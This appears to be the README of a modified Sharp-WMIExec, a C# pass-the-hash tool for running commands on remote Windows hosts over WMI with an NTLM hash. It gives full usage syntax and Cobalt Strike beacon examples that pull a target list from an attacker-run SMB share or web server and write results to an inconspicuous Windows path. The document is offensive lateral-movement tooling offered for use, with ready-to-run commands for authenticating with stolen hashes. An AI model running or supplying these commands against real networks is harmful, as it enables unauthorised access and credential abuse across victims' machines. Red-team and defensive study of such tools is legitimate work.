#### Modifed version of Sharp-WMIExec that can read a file containig IPs/hostnames and save results to a file.

# Sharp-WMIExec
A native C# conversion of Kevin Robertsons Invoke-SMBExec powershell script. (https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1)

Built for .NET 3.5

# Usage
Sharp-WMIExec.exe username:\<user\> domain:\<domain\> hash:\<ntlm\> target:\<target/file\> command:\<command\> output:\<outputFile.txt\> 

If launching from Cobalt Strike `execute-assembly`, you can host a file containing IPs/hostnames on an SMB share and specify the UNC path as the target:
```
root@kali:~# smbserver.py -smb2support myshare /root/tmp/
beacon> execute-assembly Sharp-WMIExec.exe username:someUser hash:64F12CDDAA88057E06A81B54E73B949B target:\\192.168.20.5\myshare\systems.txt output:C:\windows\tracing\log.txt
```
or a web server
```
root@kali:~# python3 -m http.server 81
beacon> execute-assembly Sharp-WMIExec.exe username:someUser hash:64F12CDDAA88057E06A81B54E73B949B target:http://192.168.20.5:81/systems.txt output:C:\windows\tracing\log.txt
```

# Description
This Assembly will allow you to execute a command on a target machine using WMI by providing an NTLM hash for the specified user.

# Help
```
Option		     Description                                                                                                                                                                                                      
username*	     Username to use for authentication                                                                     
hash*		     NTLM Password hash for authentication. This module will accept either LM:NTLM or NTLM format           
domain		     Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username
target		     Hostname/IP Address of the target or a file containg hostnames/IPs. File can be grabbed via UNC or from a web server.
command		     Command to execute on the target. If a command is not specified, the function will check to see if the username and hash provide local admin access on the target
output		     File to save results to. Results are appended if file exists

-CheckAdmin          Check admin access only, don't execute command
-Help (-h)           Switch, Enabled debugging [Default='False']  
-Debug	             Print Debugging Information along with output
```
 
